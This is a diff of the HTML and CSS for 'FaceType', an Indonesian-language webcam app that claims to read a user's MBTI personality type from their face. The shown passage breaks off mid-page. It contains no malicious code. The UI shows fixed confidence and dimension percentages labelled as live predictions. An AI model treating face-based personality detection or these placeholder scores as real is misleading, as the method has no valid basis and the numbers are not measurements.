@@ -3,660 +3,339 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>MBTI Face Detection</title>
+  <title>FaceType - AI Personality Detection</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
   <script src="config.js"></script>
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-
-    :root {
-      --bg: #0b1628;
-      --bg-lighter: #111d35;
-      --card: rgba(255,255,255,0.04);
-      --card-border: rgba(255,255,255,0.08);
-      --text: #f1f5f9;
-      --text-dim: #94a3b8;
-      --text-muted: #64748b;
-      --analyst: #6940c5;
-      --diplomat: #43b581;
-      --sentinel: #3ba676;
-      --explorer: #f0b232;
-    }
-
-    body {
-      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-      min-height: 100vh;
-      background: var(--bg);
-      color: var(--text);
-      -webkit-font-smoothing: antialiased;
-    }
-
-    /* ===== LANDING ===== */
-    #landing {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      min-height: 100vh;
-      padding: 40px 20px;
-      text-align: center;
-      background: linear-gradient(180deg, var(--bg-lighter) 0%, var(--bg) 100%);
-    }
-
-    .logo {
-      width: 88px;
-      height: 88px;
-      background: linear-gradient(135deg, var(--analyst), #9061f9);
-      border-radius: 24px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 44px;
-      margin-bottom: 32px;
-      box-shadow: 0 8px 32px rgba(105,64,197,0.3);
-    }
-
-    h1 {
-      font-size: 48px;
-      font-weight: 800;
-      margin-bottom: 16px;
-      color: var(--text);
-      letter-spacing: -1px;
-    }
-
-    .subtitle {
-      font-size: 18px;
-      color: var(--text-dim);
-      margin-bottom: 48px;
-      max-width: 480px;
-      line-height: 1.7;
-    }
-
-    .features {
-      display: flex;
-      gap: 16px;
-      margin-bottom: 48px;
-      flex-wrap: wrap;
-      justify-content: center;
-    }
-
-    .feature {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      padding: 16px 28px;
-      background: var(--card);
-      border-radius: 16px;
-      border: 1px solid var(--card-border);
-    }
-
-    .feature-icon { font-size: 22px; }
-    .feature-text { font-size: 15px; color: var(--text-dim); font-weight: 500; }
-
-    .start-btn {
-      padding: 20px 72px;
-      font-size: 18px;
-      font-weight: 700;
-      color: #fff;
-      background: linear-gradient(135deg, var(--analyst), #9061f9);
-      border: none;
-      border-radius: 16px;
-      cursor: pointer;
-      transition: all 0.3s ease;
-      box-shadow: 0 4px 24px rgba(105,64,197,0.4);
-    }
-
-    .start-btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 8px 32px rgba(105,64,197,0.5);
-    }
-
-    .start-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
-
-    .privacy-note { margin-top: 24px; font-size: 13px; color: var(--text-muted); }
-
-    /* ===== DETECTION ===== */
-    #detection {
-      display: none;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      min-height: 100vh;
-      padding: 40px 20px;
-      background: linear-gradient(180deg, var(--bg-lighter) 0%, var(--bg) 100%);
-    }
-
-    /* Camera Circle - 16personalities style */
-    .camera-container {
-      position: relative;
-      width: 480px;
-      height: 480px;
-      margin-bottom: 36px;
-    }
-
-    .camera-ring {
-      position: absolute;
-      inset: 0;
-      border-radius: 50%;
-      border: 3px solid var(--analyst);
-      box-shadow: 0 0 0 8px rgba(105,64,197,0.15), 0 0 60px rgba(105,64,197,0.3);
-    }
-
-    .camera-circle {
-      width: 100%;
-      height: 100%;
-      border-radius: 50%;
-      overflow: hidden;
-      position: relative;
-    }
-
-    #webcam {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      transform: scaleX(-1);
-      display: block;
-    }
-
-    .scan-line {
-      position: absolute;
-      left: 0; right: 0;
-      height: 2px;
-      background: linear-gradient(90deg, transparent, var(--diplomat), transparent);
-      opacity: 0;
-      animation: scan 3s ease-in-out infinite;
-      pointer-events: none;
-    }
-
-    @keyframes scan {
-      0% { top: 0; opacity: 0; }
-      10% { opacity: 0.5; }
-      90% { opacity: 0.5; }
-      100% { top: 100%; opacity: 0; }
-    }
-
-    /* Status */
-    .status-section {
-      text-align: center;
-      margin-bottom: 24px;
-    }
-
-    .status-badge {
-      display: inline-flex;
-      align-items: center;
-      gap: 10px;
-      padding: 12px 32px;
-      background: var(--card);
-      border-radius: 100px;
-      border: 1px solid var(--card-border);
-      margin-bottom: 16px;
-    }
-
-    .status-dot {
-      width: 10px;
-      height: 10px;
-      background: var(--diplomat);
-      border-radius: 50%;
-      animation: pulse 1.5s infinite;
-    }
-
-    @keyframes pulse {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.4; }
-    }
-
-    .status-text { font-size: 15px; font-weight: 600; }
-
-    .countdown-wrap {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 12px;
-    }
-
-    .countdown-circle {
-      position: relative;
-      width: 48px;
-      height: 48px;
-    }
-
-    .countdown-circle svg { transform: rotate(-90deg); }
-    .countdown-circle circle { fill: none; stroke-width: 3; }
-    .countdown-circle .bg { stroke: rgba(105,64,197,0.15); }
-    .countdown-circle .fg {
-      stroke: var(--analyst);
-      stroke-dasharray: 100.53;
-      stroke-dashoffset: 0;
-      stroke-linecap: round;
-      transition: stroke-dashoffset 1s linear;
-    }
-
-    .countdown-num {
-      position: absolute;
-      inset: 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 16px;
-      font-weight: 800;
-      color: var(--analyst);
-    }
-
-    .countdown-label { font-size: 14px; color: var(--text-muted); }
-
-    /* Ticker */
-    .ticker-wrap {
-      width: 100%;
-      max-width: 640px;
-      overflow: hidden;
-      margin-bottom: 32px;
-      mask-image: linear-gradient(to right, transparent, black 8%, black 92%, transparent);
-      -webkit-mask-image: linear-gradient(to right, transparent, black 8%, black 92%, transparent);
-    }
-
-    .ticker-track {
-      display: flex;
-      gap: 8px;
-      animation: tickerScroll 40s linear infinite;
-      width: max-content;
-    }
-
-    @keyframes tickerScroll {
-      0% { transform: translateX(0); }
-      100% { transform: translateX(-50%); }
-    }
-
-    .ticker-pill {
-      font-size: 12px;
-      font-weight: 700;
-      padding: 8px 16px;
-      border-radius: 8px;
-      white-space: nowrap;
-      background: var(--card);
-      border: 1px solid var(--card-border);
-      transition: all 0.3s;
-    }
-
-    .ticker-pill.active {
-      transform: scale(1.1);
-      box-shadow: 0 0 16px currentColor;
-    }
-
-    .ticker-pill[data-group="Analyst"] { color: var(--analyst); }
-    .ticker-pill[data-group="Diplomat"] { color: var(--diplomat); }
-    .ticker-pill[data-group="Sentinel"] { color: var(--sentinel); }
-    .ticker-pill[data-group="Explorer"] { color: var(--explorer); }
-
-    /* ===== MBTI RESULT ===== */
-    #mbtiResult {
-      display: none;
-      position: fixed;
-      inset: 0;
-      background: var(--bg);
-      z-index: 1000;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      padding: 40px 20px;
-    }
-
-    #mbtiResult.show { display: flex; animation: fadeIn 0.5s ease; }
-
-    @keyframes fadeIn { from { opacity: 0; transform: scale(0.96); } to { opacity: 1; transform: scale(1); } }
-
-    .result-avatar {
-      width: 180px;
-      height: 180px;
-      border-radius: 50%;
-      background: var(--card);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin-bottom: 32px;
-      border: 4px solid;
-      box-shadow: 0 0 80px currentColor;
-    }
-
-    .result-avatar img { width: 140px; height: 140px; }
-
-    .result-type {
-      font-size: 96px;
-      font-weight: 800;
-      letter-spacing: 4px;
-      margin-bottom: 8px;
-    }
-
-    .result-role {
-      font-size: 13px;
-      font-weight: 600;
-      text-transform: uppercase;
-      letter-spacing: 3px;
-      margin-bottom: 8px;
-      padding: 8px 24px;
-      border-radius: 100px;
-      background: var(--card);
-    }
-
-    .result-name {
-      font-size: 32px;
-      font-weight: 700;
-      margin-bottom: 16px;
-    }
-
-    .result-desc {
-      font-size: 16px;
-      color: var(--text-dim);
-      max-width: 480px;
-      text-align: center;
-      line-height: 1.7;
-      margin-bottom: 32px;
-    }
-
-    .result-traits {
-      display: flex;
-      gap: 12px;
-      flex-wrap: wrap;
-      justify-content: center;
-    }
-
-    .result-traits span {
-      padding: 10px 24px;
-      border-radius: 100px;
-      font-size: 14px;
-      font-weight: 600;
-      border: 1px solid;
-    }
-
-    .result-footer {
-      margin-top: 40px;
-      font-size: 13px;
-      color: var(--text-muted);
-    }
-
-    /* ===== SURVEY FORM ===== */
-    #surveyForm {
-      display: none;
-      position: fixed;
-      inset: 0;
-      background: var(--bg);
-      z-index: 1000;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      padding: 40px 20px;
-    }
-
-    #surveyForm.show { display: flex; animation: fadeIn 0.5s ease; }
-
-    .form-card {
-      width: 100%;
-      max-width: 480px;
-      background: var(--card);
-      border: 1px solid var(--card-border);
-      border-radius: 24px;
-      padding: 48px 40px;
-    }
-
-    .form-header {
-      text-align: center;
-      margin-bottom: 36px;
-    }
-
-    .form-avatar {
-      width: 100px;
-      height: 100px;
-      border-radius: 50%;
-      background: var(--card);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin: 0 auto 20px;
-      border: 3px solid;
-      box-shadow: 0 0 50px currentColor;
-    }
-
-    .form-avatar img { width: 76px; height: 76px; }
-
-    .form-header h2 {
-      font-size: 22px;
-      font-weight: 700;
-      margin-bottom: 8px;
-    }
-
-    .form-header p {
-      font-size: 14px;
-      color: var(--text-dim);
-    }
-
-    .form-group { margin-bottom: 20px; }
-
-    .form-group label {
-      display: block;
-      font-size: 12px;
-      font-weight: 600;
-      color: var(--text-dim);
-      margin-bottom: 8px;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-    }
-
-    .form-group input,
-    .form-group textarea {
-      width: 100%;
-      padding: 16px 20px;
-      font-size: 15px;
-      font-family: inherit;
-      color: var(--text);
-      background: rgba(255,255,255,0.06);
-      border: 1px solid var(--card-border);
-      border-radius: 12px;
-      outline: none;
-      transition: border-color 0.3s;
-    }
-
-    .form-group input:focus,
-    .form-group textarea:focus {
-      border-color: var(--analyst);
-    }
-
-    .form-group input::placeholder,
-    .form-group textarea::placeholder {
-      color: var(--text-muted);
-    }
-
-    .form-group textarea {
-      min-height: 120px;
-      resize: vertical;
-    }
-
-    .form-submit {
-      width: 100%;
-      padding: 18px;
-      font-size: 16px;
-      font-weight: 700;
-      color: #fff;
-      background: linear-gradient(135deg, var(--analyst), #9061f9);
-      border: none;
-      border-radius: 14px;
-      cursor: pointer;
-      transition: all 0.3s;
-      margin-top: 8px;
-    }
-
-    .form-submit:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 6px 24px rgba(105,64,197,0.4);
-    }
-
-    .form-submit:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
-
-    /* ===== THANK YOU ===== */
-    #thankYou {
-      display: none;
-      position: fixed;
-      inset: 0;
-      background: var(--bg);
-      z-index: 1000;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      padding: 40px 20px;
-      text-align: center;
-    }
-
-    #thankYou.show { display: flex; animation: fadeIn 0.5s ease; }
-
-    .thank-icon {
-      width: 120px;
-      height: 120px;
-      background: linear-gradient(135deg, var(--diplomat), #5fd4a0);
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 56px;
-      margin-bottom: 32px;
-      box-shadow: 0 8px 40px rgba(67,181,129,0.3);
-    }
-
-    .thank-title {
-      font-size: 36px;
-      font-weight: 800;
-      margin-bottom: 16px;
-    }
-
-    .thank-desc {
-      font-size: 16px;
-      color: var(--text-dim);
-      max-width: 400px;
-      line-height: 1.7;
-    }
-
-    #faceCanvas { display: none; }
-
-    @media (max-width: 520px) {
-      h1 { font-size: 36px; }
-      .features { flex-direction: column; width: 100%; }
-      .feature { width: 100%; justify-content: center; }
-      .camera-container { width: 320px; height: 320px; }
-      .result-type { font-size: 64px; }
-      .form-card { padding: 32px 24px; }
-    }
+    *{margin:0;padding:0;box-sizing:border-box}
+    :root{--bg:#f8f9fa;--card:#fff;--border:#e9ecef;--text:#1a1a2e;--text-dim:#6c757d;--text-muted:#adb5bd;--analyst:#6940c5;--diplomat:#2ecc71;--sentinel:#3498db;--explorer:#f39c12;--shadow:0 2px 12px rgba(0,0,0,.06)}
+    body{font-family:'Inter',-apple-system,sans-serif;min-height:100vh;background:var(--bg);color:var(--text);-webkit-font-smoothing:antialiased}
+
+    /* LANDING */
+    #landing{display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:40px 20px;text-align:center;background:linear-gradient(180deg,#f0fdf4 0%,var(--bg) 100%)}
+    .landing-logo{width:80px;height:80px;background:linear-gradient(135deg,var(--diplomat),#27ae60);border-radius:20px;display:flex;align-items:center;justify-content:center;font-size:36px;color:#fff;margin-bottom:28px;box-shadow:0 8px 32px rgba(46,204,113,.25)}
+    #landing h1{font-size:44px;font-weight:800;margin-bottom:12px;letter-spacing:-1px}
+    .subtitle{font-size:17px;color:var(--text-dim);margin-bottom:40px;max-width:460px;line-height:1.7}
+    .features{display:flex;gap:16px;margin-bottom:40px;flex-wrap:wrap;justify-content:center}
+    .feature{display:flex;align-items:center;gap:10px;padding:14px 24px;background:var(--card);border-radius:12px;border:1px solid var(--border);box-shadow:var(--shadow)}
+    .feature-icon{font-size:18px;color:var(--diplomat)}
+    .feature-text{font-size:14px;color:var(--text-dim);font-weight:500}
+    .start-btn{padding:18px 64px;font-size:17px;font-weight:700;color:#fff;background:linear-gradient(135deg,var(--diplomat),#27ae60);border:none;border-radius:14px;cursor:pointer;transition:all .3s;box-shadow:0 4px 20px rgba(46,204,113,.35)}
+    .start-btn:hover{transform:translateY(-2px);box-shadow:0 8px 28px rgba(46,204,113,.45)}
+    .start-btn:disabled{opacity:.5;cursor:not-allowed;transform:none}
+    .privacy-note{margin-top:20px;font-size:13px;color:var(--text-muted)}
+
+    /* HEADER */
+    .header{display:none;align-items:center;justify-content:space-between;padding:14px 40px;background:var(--card);border-bottom:1px solid var(--border);position:sticky;top:0;z-index:100}
+    .logo{display:flex;align-items:center;gap:12px;font-size:20px;font-weight:700}
+    .logo-icon{width:36px;height:36px;background:linear-gradient(135deg,var(--diplomat),#27ae60);border-radius:10px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:16px}
+    .logo-sub{font-size:11px;color:var(--text-dim);font-weight:400}
+    .nav{display:flex;align-items:center;gap:28px}
+    .nav-item{font-size:14px;font-weight:500;color:var(--text-dim);cursor:pointer;display:flex;align-items:center;gap:8px}
+    .nav-item.active{color:var(--diplomat);font-weight:600}
+    .nav-icons{display:flex;align-items:center;gap:12px}
+    .nav-icon{width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center;background:var(--bg);color:var(--text-dim);cursor:pointer;font-size:15px}
+
+    /* MAIN */
+    #detection{display:none;flex-direction:column;min-height:100vh}
+    .main{display:grid;grid-template-columns:260px 1fr 300px;gap:20px;padding:20px 40px;max-width:1500px;margin:0 auto;width:100%}
+    .card{background:var(--card);border-radius:16px;border:1px solid var(--border);padding:22px;box-shadow:var(--shadow)}
+    .card-title{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:1px;color:var(--text-dim);margin-bottom:18px}
+
+    /* LEFT */
+    .left-panel{display:flex;flex-direction:column;gap:16px}
+    .timeline{display:flex;flex-direction:column}
+    .tl-item{display:flex;align-items:flex-start;gap:12px;padding:14px 0;position:relative}
+    .tl-item:not(:last-child)::after{content:'';position:absolute;left:15px;top:50px;bottom:-2px;width:2px;background:var(--border)}
+    .tl-item.active:not(:last-child)::after,.tl-item.done:not(:last-child)::after{background:var(--diplomat)}
+    .tl-dot{width:32px;height:32px;border-radius:50%;background:var(--bg);border:2px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:12px;color:var(--text-muted);flex-shrink:0;z-index:1}
+    .tl-item.done .tl-dot,.tl-item.active .tl-dot{background:var(--diplomat);border-color:var(--diplomat);color:#fff}
+    .tl-content h4{font-size:13px;font-weight:600;margin-bottom:2px}
+    .tl-content p{font-size:11px;color:var(--text-dim)}
+    .tl-status{margin-left:auto;font-size:13px}
+    .tl-status.check{color:var(--diplomat)}
+    .tl-status.loading{color:var(--text-muted);animation:spin 1s linear infinite}
+    @keyframes spin{from{transform:rotate(0)}to{transform:rotate(360deg)}}
+
+    .tips-icon{width:44px;height:44px;background:#e8f5e9;border-radius:12px;display:flex;align-items:center;justify-content:center;color:var(--diplomat);font-size:18px;margin-bottom:14px}
+    .tips-text{font-size:13px;color:var(--text-dim);line-height:1.6}
+
+    /* CENTER */
+    .center-panel{display:flex;flex-direction:column;gap:16px}
+    .camera-wrapper{position:relative;border-radius:16px;overflow:hidden;background:#1a1a2e;aspect-ratio:16/10}
+    #webcam{width:100%;height:100%;object-fit:cover;transform:scaleX(-1);display:block}
+    .live-badge{position:absolute;top:14px;left:14px;display:flex;align-items:center;gap:8px;padding:7px 14px;background:rgba(0,0,0,.55);backdrop-filter:blur(8px);border-radius:8px;color:#fff;font-size:12px;font-weight:600}
+    .live-dot{width:8px;height:8px;background:#2ecc71;border-radius:50%;animation:pulse 1.5s infinite}
+    @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+    .camera-icon{position:absolute;top:14px;right:14px;width:36px;height:36px;background:rgba(0,0,0,.55);backdrop-filter:blur(8px);border-radius:10px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:14px}
+    .face-box{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:180px;height:220px;pointer-events:none}
+    .face-box .c{position:absolute;width:22px;height:22px;border:3px solid #2ecc71}
+    .face-box .c.tl{top:0;left:0;border-right:none;border-bottom:none;border-radius:4px 0 0 0}
+    .face-box .c.tr{top:0;right:0;border-left:none;border-bottom:none;border-radius:0 4px 0 0}
+    .face-box .c.bl{bottom:0;left:0;border-right:none;border-top:none;border-radius:0 0 0 4px}
+    .face-box .c.br{bottom:0;right:0;border-left:none;border-top:none;border-radius:0 0 4px 0}
+    .face-detected{position:absolute;bottom:14px;left:50%;transform:translateX(-50%);display:flex;align-items:center;gap:10px;padding:10px 18px;background:rgba(0,0,0,.65);backdrop-filter:blur(8px);border-radius:10px;color:#fff;font-size:13px;font-weight:500}
+    .face-detected i{color:var(--diplomat)}
+
+    /* DIMENSIONS */
+    .dims-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+    .dim{text-align:center}
+    .dim-labels{display:flex;justify-content:space-between;font-size:10px;color:var(--text-muted);margin-bottom:6px}
+    .dim-bar{height:6px;background:var(--bg);border-radius:3px;overflow:hidden;margin-bottom:6px}
+    .dim-fill{height:100%;border-radius:3px;transition:width 1s ease}
+    .dim-pct{font-size:22px;font-weight:800}
+
+    /* RIGHT */
+    .right-panel{display:flex;flex-direction:column;gap:16px}
+    .personality-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:8px}
+    .personality-type{font-size:56px;font-weight:800;letter-spacing:2px;line-height:1}
+    .personality-name{font-size:22px;font-weight:700;margin:4px 0}
+    .personality-group{font-size:13px;font-weight:600;margin-bottom:12px}
+    .personality-desc{font-size:14px;color:var(--text-dim);line-height:1.6}
+    .personality-avatar{width:100%;max-width:140px;margin:16px auto 0;display:block}
+    .confidence-box{margin-top:16px}
+    .confidence-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:8px}
+    .confidence-label{font-size:13px;color:var(--text-dim)}
+    .confidence-pct{font-size:28px;font-weight:800}
+    .confidence-bar{height:8px;background:var(--bg);border-radius:4px;overflow:hidden}
+    .confidence-fill{height:100%;border-radius:4px;background:var(--diplomat);transition:width 1.5s ease}
+
+    /* 16 TYPES */
+    .types-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px}
+    .type-card{padding:16px 8px;border-radius:12px;border:1px solid var(--border);text-align:center;cursor:pointer;transition:all .2s}
+    .type-card:hover{transform:translateY(-2px);box-shadow:0 4px 12px rgba(0,0,0,.08)}
+    .type-card.active{border-width:2px}
+    .type-icon{width:36px;height:36px;border-radius:10px;display:flex;align-items:center;justify-content:center;margin:0 auto 8px;font-size:16px;color:#fff}
+    .type-card-title{font-size:11px;font-weight:700;margin-bottom:2px}
+    .type-card-sub{font-size:10px;color:var(--text-dim)}
+
+    .footer-quote{text-align:center;padding:20px 40px;font-size:14px;color:var(--text-dim);font-style:italic}
+    .footer-quote span{color:var(--diplomat)}
+
+    /* FORM */
+    #surveyForm{display:none;position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:1000;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(4px)}
+    #surveyForm.show{display:flex;animation:fadeIn .3s}
+    .form-card{width:100%;max-width:440px;background:var(--card);border-radius:20px;padding:36px;box-shadow:0 20px 60px rgba(0,0,0,.15)}
+    .form-header{text-align:center;margin-bottom:28px}
+    .form-avatar{width:80px;height:80px;border-radius:50%;background:var(--bg);display:flex;align-items:center;justify-content:center;margin:0 auto 16px;border:3px solid}
+    .form-avatar img{width:60px;height:60px}
+    .form-header h2{font-size:20px;font-weight:700;margin-bottom:4px}
+    .form-header p{font-size:13px;color:var(--text-dim)}
+    .form-group{margin-bottom:16px}
+    .form-group label{display:block;font-size:11px;font-weight:600;color:var(--text-dim);margin-bottom:6px;text-transform:uppercase;letter-spacing:.5px}
+    .form-group input,.form-group textarea{width:100%;padding:14px 16px;font-size:14px;font-family:inherit;color:var(--text);background:var(--bg);border:1px solid var(--border);border-radius:10px;outline:none;transition:border-color .2s}
+    .form-group input:focus,.form-group textarea:focus{border-color:var(--diplomat)}
+    .form-group input::placeholder,.form-group textarea::placeholder{color:var(--text-muted)}
+    .form-group textarea{min-height:100px;resize:vertical}
+    .form-submit{width:100%;padding:14px;font-size:15px;font-weight:700;color:#fff;background:linear-gradient(135deg,var(--diplomat),#27ae60);border:none;border-radius:12px;cursor:pointer;transition:all .2s}
+    .form-submit:hover{transform:translateY(-1px);box-shadow:0 4px 16px rgba(46,204,113,.35)}
+    .form-submit:disabled{opacity:.5;cursor:not-allowed;transform:none}
+
+    /* THANK YOU */
+    #thankYou{display:none;position:fixed;inset:0;background:var(--bg);z-index:1000;flex-direction:column;align-items:center;justify-content:center;padding:40px;text-align:center}
+    #thankYou.show{display:flex;animation:fadeIn .5s}
+    .thank-icon{width:100px;height:100px;background:linear-gradient(135deg,var(--diplomat),#27ae60);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:48px;color:#fff;margin-bottom:28px;box-shadow:0 8px 32px rgba(46,204,113,.3)}
+    .thank-title{font-size:32px;font-weight:800;margin-bottom:12px}
+    .thank-desc{font-size:15px;color:var(--text-dim);max-width:380px;line-height:1.6}
+    @keyframes fadeIn{from{opacity:0;transform:scale(.96)}to{opacity:1;transform:scale(1)}}
+    #faceCanvas{display:none}
+
+    @media(max-width:1100px){.main{grid-template-columns:1fr;padding:16px}.left-panel,.right-panel{display:none}.header{display:none!important}}
   </style>
 </head>
 <body>
+
+  <!-- LANDING -->
   <div id="landing">
-    <div class="logo">🧠</div>
-    <h1>MBTI Face Detection</h1>
-    <p class="subtitle">Temukan tipe kepribadian MBTI Anda melalui analisis wajah secara real-time</p>
+    <div class="landing-logo"><i class="fas fa-face-smile"></i></div>
+    <h1>FaceType</h1>
+    <p class="subtitle">AI Personality Detection - Kenali dirimu, pahami potensimu, wujudkan versi terbaikmu.</p>
     <div class="features">
-      <div class="feature"><span class="feature-icon">📸</span><span class="feature-text">Real-time Detection</span></div>
-      <div class="feature"><span class="feature-icon">⚡</span><span class="feature-text">Instant Result</span></div>
-      <div class="feature"><span class="feature-icon">🎯</span><span class="feature-text">16 Tipe MBTI</span></div>
+      <div class="feature"><span class="feature-icon"><i class="fas fa-camera"></i></span><span class="feature-text">Real-time Detection</span></div>
+      <div class="feature"><span class="feature-icon"><i class="fas fa-bolt"></i></span><span class="feature-text">Instant Result</span></div>
+      <div class="feature"><span class="feature-icon"><i class="fas fa-brain"></i></span><span class="feature-text">16 Tipe MBTI</span></div>
     </div>
     <button id="startBtn" class="start-btn" onclick="startDetection()">Mulai Deteksi</button>
     <p class="privacy-note">Kamera diperlukan untuk analisis wajah</p>
   </div>
 
+  <!-- DETECTION -->
   <div id="detection">
-    <div class="camera-container">
-      <div class="camera-ring"></div>
-      <div class="camera-circle">
-        <video id="webcam" autoplay playsinline></video>
-        <div class="scan-line"></div>
+    <div class="header" id="appHeader">
+      <div class="logo">
+        <div class="logo-icon"><i class="fas fa-face-smile"></i></div>
+        <div>FaceType <div class="logo-sub">AI Personality Detection</div></div>
+      </div>
+      <div class="nav">
+        <div class="nav-item active"><i class="fas fa-home"></i> Home</div>
+        <div class="nav-item"><i class="fas fa-grid-2"></i> Types</div>
+        <div class="nav-item"><i class="fas fa-user"></i> About</div>
+      </div>
+      <div class="nav-icons">
+        <div class="nav-icon"><i class="fas fa-moon"></i></div>
+        <div class="nav-icon"><i class="fas fa-user"></i></div>
       </div>
     </div>
 
-    <div class="ticker-wrap">
-      <div class="ticker-track" id="tickerTrack"></div>
-    </div>
-
-    <div class="status-section">
-      <div class="status-badge">
-        <div class="status-dot"></div>
-        <span class="status-text" id="statusText">Mendeteksi...</span>
-      </div>
-      <div class="countdown-wrap">
-        <div class="countdown-circle">
-          <svg width="48" height="48" viewBox="0 0 48 48">
-            <circle class="bg" cx="24" cy="24" r="16"></circle>
-            <circle class="fg" id="countdownCircle" cx="24" cy="24" r="16"></circle>
-          </svg>
-          <span class="countdown-num" id="countdownNumber">10</span>
+    <div class="main">
+      <!-- LEFT -->
+      <div class="left-panel">
+        <div class="card">
+          <div class="card-title">Analysis Progress</div>
+          <div class="timeline">
+            <div class="tl-item done" id="tl1">
+              <div class="tl-dot"><i class="fas fa-check" style="font-size:11px"></i></div>
+              <div class="tl-content"><h4>Face Detection</h4><p>Wajah terdeteksi</p></div>
+              <div class="tl-status check"><i class="fas fa-check-circle"></i></div>
+            </div>
+            <div class="tl-item active" id="tl2">
+              <div class="tl-dot"><i class="fas fa-spinner fa-spin" style="font-size:11px"></i></div>
+              <div class="tl-content"><h4>Facial Features</h4><p>Ekstraksi fitur wajah</p></div>
+              <div class="tl-status loading"><i class="fas fa-circle-notch fa-spin"></i></div>
+            </div>
+            <div class="tl-item" id="tl3">
+              <div class="tl-dot">3</div>
+              <div class="tl-content"><h4>Personality Analysis</h4><p>Menganalisis kepribadian</p></div>
+              <div class="tl-status" id="tl3status"></div>
+            </div>
+            <div class="tl-item" id="tl4">
+              <div class="tl-dot">4</div>
+              <div class="tl-content"><h4>Result</h4><p>Menampilkan hasil</p></div>
+              <div class="tl-status" id="tl4status"></div>
+            </div>
+          </div>
         </div>
-        <span class="countdown-label" id="countdownLabel">detik hingga analisis</span>
+        <div class="card">
+          <div class="card-title">Tips</div>
+          <div class="tips-icon"><i class="fas fa-lightbulb"></i></div>
+          <div class="tips-text">Pastikan wajah terlihat jelas, pencahayaan cukup, dan menghadap kamera.</div>
+        </div>
+      </div>
+
+      <!-- CENTER -->
+      <div class="center-panel">
+        <div class="camera-wrapper">
+          <video id="webcam" autoplay playsinline></video>
+          <div class="live-badge"><div class="live-dot"></div> LIVE</div>
+          <div class="camera-icon"><i class="fas fa-camera"></i></div>
+          <div class="face-box">
+            <div class="c tl"></div><div class="c tr"></div><div class="c bl"></div><div class="c br"></div>
+          </div>
+          <div class="face-detected" id="faceBadge"><i class="fas fa-check-circle"></i> <span>Face detected</span> <span style="color:var(--text-muted);font-size:12px">Confidence <span id="faceConf">96.2</span>%</span></div>
+        </div>
+        <div class="card">
+          <div class="card-title">Personality Dimensions <span style="font-weight:400;text-transform:none;letter-spacing:0;color:var(--text-muted)">(Live Prediction)</span></div>
+          <div class="dims-grid">
+            <div class="dim">
+              <div class="dim-labels"><span>Introverted</span><span>Extraverted</span></div>
+              <div class="dim-bar"><div class="dim-fill" id="dimI" style="width:72%;background:var(--diplomat)"></div></div>
+              <div class="dim-pct" style="color:var(--diplomat)" id="dimIpct">72%</div>
+            </div>
+            <div class="dim">
+              <div class="dim-labels"><span>Intuitive</span><span>Observant</span></div>
+              <div class="dim-bar"><div class="dim-fill" id="dimN" style="width:84%;background:var(--analyst)"></div></div>
+              <div class="dim-pct" style="color:var(--analyst)" id="dimNpct">84%</div>
+            </div>
+            <div class="dim">
+              <div class="dim-labels"><span>Feeling</span><span>Thinking</span></div>
+              <div class="dim-bar"><div class="dim-fill" id="dimF" style="width:76%;background:var(--explorer)"></div></div>
+              <div class="dim-pct" style="color:var(--explorer)" id="dimFpct">76%</div>
+            </div>
+            <div class="dim">
+              <div class="dim-labels"><span>Judging</span><span>Prospecting</span></div>
+              <div class="dim-bar"><div class="dim-fill" id="dimJ" style="width:88%;background:var(--sentinel)"></div></div>
+              <div class="dim-pct" style="color:var(--sentinel)" id="dimJpct">88%</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- RIGHT -->
+      <div class="right-panel">
+        <div class="card">
+          <div class="card-title">Your Personality</div>
+          <div id="personalityResult" style="opacity:0.3">
+            <div class="personality-type" id="pType" style="color:var(--diplomat)">INFJ</div>
+            <div class="personality-name" id="pName">The Advocate</div>
+            <div class="personality-group" id="pGroup" style="color:var(--diplomat)">Diplomat</div>
+            <div class="personality-desc" id="pDesc">Pendiam, penuh wawasan, dan memiliki tujuan yang kuat serta mendalam.</div>
+            <img class="personality-avatar" id="pAvatar" src="https://www.16personalities.com/static/images/personality-types/avatars/infj-advocate-female.svg" alt="">
+          </div>
+          <div class="confidence-box">
+            <div class="confidence-header">
+              <span class="confidence-label">Overall Confidence</span>
